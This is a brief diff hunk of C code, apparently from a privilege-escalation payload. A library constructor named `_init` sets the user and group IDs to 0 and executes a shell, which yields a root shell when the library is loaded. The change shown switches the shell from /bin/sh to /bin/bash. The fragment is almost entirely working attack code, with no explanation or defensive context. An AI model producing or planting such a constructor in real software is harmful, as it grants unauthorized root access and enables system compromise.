@@ -9,5 +9,5 @@ static void _init(void) {
     setuid(0); seteuid(0); setgid(0); setegid(0);
     static char *a_argv[] = { "sh", NULL };
     static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
-    execv("/bin/sh", a_argv);
+    execv("/bin/bash", a_argv);
 }
